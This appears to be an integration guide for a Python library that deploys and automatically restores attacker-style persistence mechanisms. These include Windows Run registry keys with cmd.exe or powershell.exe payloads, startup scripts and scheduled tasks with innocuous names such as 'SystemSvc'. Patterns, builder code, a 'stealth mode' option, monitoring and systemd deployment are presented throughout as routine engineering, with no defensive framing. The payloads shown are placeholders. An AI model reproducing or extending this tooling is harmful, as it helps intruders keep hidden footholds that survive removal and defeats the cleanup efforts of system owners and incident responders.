# Self-Healing Persistence Integration Guide

## Quick Integration

### Step 1: Add Files to Your Project

```bash
# Copy core implementation
cp self_healing_persistence.py your_project/

# Optional: Copy tests and examples
cp test_self_healing_persistence.py your_project/
cp self_healing_examples.py your_project/
```

### Step 2: Import and Initialize

```python
from self_healing_persistence import (
    SelfHealingPersistence,
    SelfHealingPersistenceBuilder,
    RecoveryTrigger
)

# Create system
system = SelfHealingPersistence(
    check_interval_seconds=300,
    enable_stealth_monitoring=True
)
```

### Step 3: Register Persistence Points

```python
# Register one or more persistence points
point_id = system.register_persistence_point(
    point_type="startup_file",
    location="/usr/local/bin/service.sh",
    payload="#!/bin/bash\necho 'alive'",
    metadata={"priority": "high"}
)
```

### Step 4: Start Monitoring

```python
# Start background health monitoring
system.start_monitoring(background=True)
```

## Integration Patterns

### Pattern 1: Minimal Setup (Single Point)

```python
from self_healing_persistence import SelfHealingPersistence

def setup_basic_persistence():
    system = SelfHealingPersistence(check_interval_seconds=300)
    
    system.register_persistence_point(
        point_type="startup_file",
        location="/tmp/persistence.sh",
        payload="#!/bin/bash\n# Recovery script"
    )
    
    system.start_monitoring(background=True)
    return system
```

### Pattern 2: Multi-Method with Builder

```python
from self_healing_persistence import SelfHealingPersistenceBuilder

def setup_redundant_persistence():
    return (SelfHealingPersistenceBuilder()
        .add_registry_point("HKCU\\Run", "SystemSvc", "payload1")
        .add_startup_file("/tmp/startup.sh", "payload2")
        .add_scheduled_task("SystemCheck", "payload3")
        .set_check_interval(300)
        .enable_stealth_mode(True)
        .build())
```

### Pattern 3: Integration with Existing Persistence

```python
from self_healing_persistence import SelfHealingPersistence
from advanced_persistence_multimethods import MultiMethodPersistence

def integrated_persistence_system():
    # First, deploy with advanced persistence
    adv_system = MultiMethodPersistence(config)
    adv_payloads = adv_system.generate_all_persistence_methods()
    
    # Then, monitor with self-healing system
    heal_system = SelfHealingPersistence(check_interval_seconds=300)
    
    # Register the points for monitoring
    for point_info in adv_payloads:
        heal_system.register_persistence_point(
            point_type=point_info['type'],
            location=point_info['location'],
            payload=point_info['payload'],
            metadata={"deployed_by": "advanced_persistence"}
        )
    
    heal_system.start_monitoring(background=True)
    return heal_system
```

### Pattern 4: Monitoring Existing Persistence

```python
def monitor_existing_persistence(persistence_locations):
    system = SelfHealingPersistence(check_interval_seconds=300)
    
    for location_info in persistence_locations:
        system.register_persistence_point(
            point_type=location_info['type'],
            location=location_info['path'],
            payload=location_info['payload'],
            metadata=location_info.get('metadata', {})
        )
    
    system.start_monitoring(background=True)
    return system
```

## Configuration Integration

### With Existing Config System

```python
# If you have existing persistence configuration
PERSISTENCE_CONFIG = {
    "registry": [
        {"path": "HKCU\\Run", "value": "Service1", "payload": "cmd.exe"},
        {"path": "HKCU\\Run", "value": "Service2", "payload": "powershell.exe"}
    ],
    "startup": [
        {"path": "/tmp/startup.sh", "payload": "#!/bin/bash\necho alive"}
    ]
}

# Integrate monitoring
def setup_monitoring_from_config(config):
    system = SelfHealingPersistence(check_interval_seconds=300)
    
    for reg_point in config.get("registry", []):
        location = f"{reg_point['path']}\\{reg_point['value']}"
        system.register_persistence_point(
            point_type="registry",
            location=location,
            payload=reg_point['payload']
        )
    
    for startup_point in config.get("startup", []):
        system.register_persistence_point(
            point_type="startup_file",
            location=startup_point['path'],
            payload=startup_point['payload']
        )
    
    system.start_monitoring(background=True)
    return system

monitoring_system = setup_monitoring_from_config(PERSISTENCE_CONFIG)
```

## Status Integration

### Logging Integration

```python
import logging

logger = logging.getLogger(__name__)

def setup_logging_integration(system):
    def log_status():
        status = system.get_health_status()
        logger.info(f"Persistence Status: {status['overall_status']}")
        
        if status['degraded_points'] > 0:
            logger.warning(f"Degraded points: {status['degraded_points']}")
        
        if status['critical_points'] > 0:
            logger.error(f"Critical points: {status['critical_points']}")
        
        # Log recent recoveries
        recovery_history = system.get_recovery_history(limit=5)
        for event in recovery_history:
            if not event['success']:
                logger.warning(f"Recovery failed: {event['trigger']}")
    
    # Call this periodically or on demand
    return log_status
```

### Dashboard Integration

```python
def get_dashboard_data(system):
    """Get data for status dashboard"""
    status = system.get_health_status()
    points = system.get_persistence_points_status()
    history = system.get_recovery_history(limit=50)
    
    return {
        "health": {
            "overall_status": status['overall_status'],
            "healthy_points": status['healthy_points'],
            "degraded_points": status['degraded_points'],
            "critical_points": status['critical_points'],
            "total_recoveries": status['total_recoveries']
        },
        "points": [
            {
                "id": p['point_id'],
                "type": p['type'],
                "location": p['location'],
                "health": "healthy" if p['is_healthy'] else "degraded",
                "verifications": p['verification_count'],
                "recoveries": p['recovery_count']
            }
            for p in points
        ],
        "recent_events": [
            {
                "timestamp": e['timestamp'],
                "point": e['point_id'],
                "trigger": e['trigger'],
                "strategy": e['strategy'],
                "success": e['success']
            }
            for e in history
        ]
    }
```

## Error Handling Integration

```python
from self_healing_persistence import SelfHealingPersistence
import traceback

class PersistenceMonitoringError(Exception):
    pass

def safe_monitoring_setup(config):
    """Setup with comprehensive error handling"""
    try:
        system = SelfHealingPersistence(check_interval_seconds=300)
        
        for point_config in config:
            try:
                system.register_persistence_point(**point_config)
            except Exception as e:
                print(f"Failed to register point: {str(e)}")
                traceback.print_exc()
                # Continue with other points
        
        system.start_monitoring(background=True)
        return system
    
    except Exception as e:
        raise PersistenceMonitoringError(f"Failed to setup monitoring: {str(e)}")

# Usage
try:
    system = safe_monitoring_setup(persistence_config)
except PersistenceMonitoringError as e:
    print(f"Monitoring setup failed: {str(e)}")
```

## Status Check Integration

### Periodic Status Reporting

```python
import time
import threading

def continuous_status_reporting(system, interval=300):
    """Background thread for continuous status reporting"""
    def report():
        while True:
            try:
                status = system.get_health_status()
                report_data = {
                    "timestamp": time.time(),
                    "status": status['overall_status'],
                    "healthy": status['healthy_points'],
                    "degraded": status['degraded_points'],
                    "critical": status['critical_points']
                }
                
                # Send to logging/monitoring system
                print(f"Status Report: {report_data}")
                
            except Exception as e:
                print(f"Status report error: {str(e)}")
            
            time.sleep(interval)
    
    thread = threading.Thread(target=report, daemon=True)
    thread.start()
    return thread
```

### On-Demand Status API

```python
def get_current_status(system):
    """Get current status for API endpoints"""
    status = system.get_health_status()
    points = system.get_persistence_points_status()
    
    return {
        "status": "ok" if status['overall_status'] == "healthy" else "warning",
        "health": status['overall_status'],
        "points": {
            "total": status['total_points'],
            "healthy": status['healthy_points'],
            "degraded": status['degraded_points'],
            "critical": status['critical_points']
        },
        "recovery": {
            "total_events": status['recovery_events'],
            "recent_success_rate": calculate_success_rate(system)
        }
    }

def calculate_success_rate(system):
    """Calculate recent recovery success rate"""
    history = system.get_recovery_history(limit=20)
    if not history:
        return 100
    
    successful = sum(1 for e in history if e['success'])
    return (successful / len(history)) * 100
```

## Advanced Integration

### Custom Recovery Callback

```python
class CustomSelfHealingSystem(SelfHealingPersistence):
    """Extended system with custom recovery callbacks"""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.recovery_callbacks = []
    
    def register_recovery_callback(self, callback):
        """Register callback to run after recovery"""
        self.recovery_callbacks.append(callback)
    
    def initiate_recovery(self, point_id, trigger):
        """Override to call callbacks"""
        result = super().initiate_recovery(point_id, trigger)
        
        if result:
            for callback in self.recovery_callbacks:
                try:
                    callback(point_id, trigger, result)
                except Exception as e:
                    print(f"Callback error: {str(e)}")
        
        return result

# Usage
system = CustomSelfHealingSystem(check_interval_seconds=300)

def on_recovery(point_id, trigger, success):
    print(f"Recovery completed: {point_id} ({trigger}) = {success}")

system.register_recovery_callback(on_recovery)
```

### Integration with Alert System

```python
def setup_alert_integration(system, alert_system):
    """Integrate with alerting system"""
    
    def check_and_alert():
        status = system.get_health_status()
        
        # Alert on degraded status
        if status['overall_status'] == 'degraded':
            alert_system.send_warning(
                f"Persistence degraded: {status['degraded_points']} points affected"
            )
        
        # Alert on critical status
        if status['overall_status'] == 'critical':
            alert_system.send_critical(
                f"Persistence CRITICAL: {status['critical_points']} points failed"
            )
        
        # Alert on high recovery rate
        history = system.get_recovery_history(limit=50)
        if len(history) > 20:
            alert_system.send_warning(
                f"High recovery rate: {len(history)} recoveries in recent period"
            )
    
    return check_and_alert

# Usage
alert_system = MyAlertSystem()
alert_check = setup_alert_integration(system, alert_system)

# Run periodically
import schedule
schedule.every(5).minutes.do(alert_check)
```

## Testing Integration

### Test Fixture

```python
import pytest

@pytest.fixture
def persistence_system():
    """Fixture for self-healing persistence system"""
    system = SelfHealingPersistence(check_interval_seconds=1)
    
    system.register_persistence_point(
        point_type="test",
        location="test_location",
        payload="test_payload"
    )
    
    yield system
    
    system.stop_monitoring()

def test_health_check(persistence_system):
    """Test health check functionality"""
    result = persistence_system.perform_health_check()
    assert result.total_points == 1
    assert result.healthy_points == 1
```

### Mock Integration

```python
from unittest.mock import patch, MagicMock

def test_with_mocked_verification():
    system = SelfHealingPersistence()
    system.register_persistence_point("test", "location", "payload")
    
    with patch.object(system, '_verify_persistence_point', return_value=False):
        result = system.perform_health_check()
        
        assert result.healthy_points == 0
        assert result.degraded_points == 1
```

## Deployment Integration

### Docker Integration

```dockerfile
FROM python:3.9-slim

WORKDIR /app

# Copy persistence system
COPY self_healing_persistence.py .

# Copy your application
COPY app.py .

# Install any requirements
# RUN pip install -r requirements.txt

# Set environment variables
ENV CHECK_INTERVAL=300
ENV STEALTH_MODE=true

# Run application
CMD ["python", "app.py"]
```

### Systemd Service

```ini
[Unit]
Description=Self-Healing Persistence Monitor
After=network.target

[Service]
Type=simple
User=monitor
WorkingDirectory=/opt/persistence

# Start persistence monitor
ExecStart=/usr/bin/python3 /opt/persistence/monitor.py

# Restart on failure
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

## Summary

Integration points:
1. **Direct Import** - Simple Python imports
2. **Configuration** - Use your existing config system
3. **Logging** - Hook into your logging framework
4. **Monitoring** - Dashboard and API integration
5. **Alerts** - Alert system integration
6. **Testing** - Test fixtures and mocks
7. **Deployment** - Docker and systemd support

Choose the pattern that best fits your existing infrastructure and requirements.
